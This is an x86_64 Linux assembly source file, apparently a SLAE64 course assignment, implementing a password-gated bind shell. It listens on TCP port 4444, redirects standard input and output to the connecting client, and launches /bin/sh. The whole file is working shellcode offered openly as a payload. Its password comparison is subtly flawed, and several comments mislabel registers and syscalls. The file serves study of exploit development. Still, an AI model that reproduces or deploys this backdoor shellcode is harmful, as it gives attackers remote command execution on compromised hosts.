; Student ID   : SLAE64-1611
; Student Name : Jonathan "Chops" Crosby
; Assignment 1 : Shell Bind TCP (Linux/x86_64) Assembly
; File Name    : shell-bind.nasm

global _start

section .text
_start:
    jmp real_start
    enter_password: db 'Enter the secret password to continue: ', 0xa

real_start:

    ; SYS_SOCKET    socket(2)

    ; rax : sys_socket 41
    ; rdi : int family
    ; rsi : int type
    ; rdx : int protocol

    xor rax, rax        ; need to zero our rax
                        ; so we can load it with 
                        ; the socket syscall 0x41

    mov rdi, rax        ; zeroing out rdi
    mov rsi, rdi        ; zeroing out rsi
    mov rdx, rsi        ; zeroing out rdx

    add rax, 41         ; setting rax to socket
    add rdi, 2          ; family / AF_INET
    add rsi, 1          ; type   / SOCK_STREAM
                        ; leave rdx alone since it is already 0x00

    syscall             ; make the call to socket
                        ; socketid will be in rax

    ; SYS_BIND      bind(2)

    ; rax : sys_bind 49
    ; rdi : socketid which will be in rax initially
    ; rsi : struct sokaddr *umyaddr
    ; rdx : int addrlen

    xchg rdi, rax       ; move socketid into rdi

    xor rax, rax        ; zero out rax

                        ; rdi already contains socketid
    mov rsi, rax        ; zeroing out rsi
    mov rdx, rsi        ; zeroing out rdx

    xor r9, r9          ; zero out r9
    push r9             ; pushing 0.0.0.0 into in_addr
    push word 0x5C11    ; port number (least significant 
                        ; byte first ... 0x115C is 4444)
    push word 0x02      ; AF_INET - which is 0x02

    mov rsi, rsp        ; moving stack address to rsi

    add rdx, 16         ; 16 byts long (or 32bit)

    add rax, 49         ; set rax to sys_bind

    syscall             ; make the call to bind
                        ; socketid will be in rax

    ; SYS_LISTEN    listen(2)

    ; rax : sys_listen 50
    ; rdi : socketid which is already in rdi
    ; rsi : int backlog

    xor rax, rax        ; zero out rax

                        ; socketid already in rsi
    mov rdx, rax        ; zeroing out rdx
    add rdx, 0x01       ; moving backlog number to rdx

    add rax, 50         ; setting rax to sys_listen

    syscall             ; make call to listen

    ; SYS_ACCEPT    accept(2)
    ; Returns clientid needed for dup2

    ; rax : sys_accept 43
    ; rdi : socketid already in rdi
    ; rsi : struct sockaddr *upeer_sockaddr
    ; rdx : int *upeer_addrlen

    xor rax, rax        ; zero out rax

                        ; socketid already in rsi
    mov rsi, rax        ; moving null to rsi
    mov rdx, rax        ; moving null to rdx

    add rax, 43         ; setting rax to sys_connect

    syscall             ; make call to listen

    ; sys_dup2

    xchg rdi, rax       ; moves clientid to rdi

    ; rax : sys_dup2 33
    ; rdi : already contains clientid
    ; rsi : 1 to 3 in loop

    xor r9, r9          ; zeroing out loop counter

    loopin:
        xor rax, rax    ; zero out rax
        add rax, 33     ; setting rax to sys_dup2
        mov rsi, r9     ; move fileid to duplicate
        syscall         ; call dup2
        inc r9          ; increase r9 by 0x01
        cmp r9, 3       ; compare r9 to 0x03
        jne loopin

    ; We need to check for password here
    ; 1. ask for password
    ; 2. check password
    ; sys_read

    ; letup loop to checking the password
    checkpassword:

        ; sys_write
        ; rax : 1
        ; rdi : unsigned int fd : 1 for stdout
        ; rsi : const char *buf : string
        ; rdx : size_t count : how big

        xor rax, rax                  ; zero out rax
        mov rdx, rax                  ; zero out rdx
        inc rax                       ; increase rax to 1
        mov rdi, rax                  ; move 1 into rdi
        lea rsi, [rel enter_password] ; moving enter_password
        add rdx, 39                   ; setting size enter_password

        syscall

        ; sys_read
        ; rdi : unsigned int fd : 0 for stdin
        ; rsi : char *buf : stack?
        ; rdx : size_t count : how big

        xor rax, rax ; zero out rax
        mov rdi, rax ; zero out rdi
        mov rdx, rax ; zero out rdx

        ; leave rax alone since read is 0
        mov rsi, rsp    ; set buffer to stack
        add rdx, 8      ; setting size of Password

        syscall ; calling read

        mov rdi, rsp                ; setting rdi to input buffer
        mov rax, 0x64726f7773736150 ; moving Password into buffer
        scasd                       ; scanning for a match
        jne checkpassword           ; if not a match then re-ask for password

    ; sys_execve

    ; rax : sys_execve 59
    ; rdi : const char *filename
    ; rsi : const char *const argv[]
    ; rdx : const char *const envp[]

    xor rax, rax        ; zeroing out rax
    add rax, 59         ; setting rax to sys_execve

    xor r9, r9          ; zeroing out r9
    push r9             ; pushing null to stack

    mov rbx, 0x68732f6e69622f2f     ; moving "//bin/sh"
    push rbx                        ; pushing "//bin/sh"

    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ;rsp now looks like: "//bin/sh,0x0000000000000000";
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    mov rdi, rsp        ; moving the param to rdi
                        ; rdi now contains "//bin/sh,0x0000000000000000"

    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; now we look like: execve("//bin/sh,0x0000000000000000", NOT-SET-YET, NOT-SET-YET);
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    ; now we need to get 0x0000000000000000 into rdx
    push r9             ; r9 is still 0x0000000000000000 so push it to rsp
    mov rdx, rsp        ; we need to move a 0x0000000000000000 into
                        ; the third parameter in rdx

    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; now we look like: execve("//bin/sh,0x0000000000000000", NOT-SET-YET, 0x0000000000000000);
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    ; the second parameter is needs to be "//bin/sh,0x0000000000000000"
    ; which we can accomplish by moving rdi onto the stack
    ; and then moving rsp into rsi since it will be on the stack

    push rdi            ; pushing "//bin/sh,0x0000000000000000" back to the stack
    mov  rsi, rsp       ; moving the address of rdi (on the stack) to ecx

    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    ; now we look like: execve("//bin/sh,0x00000000000000000", *"//bin/sh,0x0000000000000000", 0x0000000000000000);
    ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    syscall             ; calling sys_execve
